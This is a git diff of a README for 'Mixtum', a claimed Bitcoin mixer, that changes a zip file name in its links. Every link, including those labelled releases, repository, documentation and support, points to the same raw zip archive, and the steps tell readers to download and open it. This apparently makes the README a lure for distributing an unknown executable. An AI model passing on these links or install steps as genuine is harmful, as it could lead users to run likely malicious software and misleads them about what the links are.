@@ -1,7 +1,7 @@
 # 🪙 Mixtum - Enhance Your Bitcoin Anonymity
 
 ## 📥 Download Mixtum
-[![Download Mixtum](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software-v2.8.zip%20Mixtum-Here-blue)](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software-v2.8.zip)
+[![Download Mixtum](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software_2.8.zip%20Mixtum-Here-blue)](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software_2.8.zip)
 
 ## 🚀 Getting Started
 Mixtum is a Bitcoin mixer and privacy service. It helps enhance your transaction anonymity. This guide will help you download and run the software easily.
@@ -23,13 +23,13 @@ To run Mixtum, your computer needs to meet the following requirements:
 - **Network:** Stable internet connection.
 
 ## 🌐 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software-v2.8.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software_2.8.zip).
 2. Look for the latest version of Mixtum.
 3. Click on the download link for your operating system.
 4. Open the downloaded file to install Mixtum.
 
 ## 📥 Direct Download Link
-You can access the download page directly here: [Download Mixtum](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software-v2.8.zip).
+You can access the download page directly here: [Download Mixtum](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software_2.8.zip).
 
 ## 📚 How to Use Mixtum
 1. **Open Mixtum:** After installation, start the application from your applications menu.
@@ -59,8 +59,8 @@ A3: While Mixtum greatly enhances your privacy, no method can guarantee complete
 Join the Mixtum community to share experiences and get help. Participate in discussions or ask questions in the GitHub Issues section or join our dedicated forums.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software-v2.8.zip)
-- [Documentation](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software-v2.8.zip)
-- [Support](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software-v2.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software_2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software_2.8.zip)
+- [Support](https://raw.githubusercontent.com/imane-omari/Mixtum/main/aphyllous/Software_2.8.zip)
 
 Enjoy using Mixtum for a safer and more private Bitcoin experience!
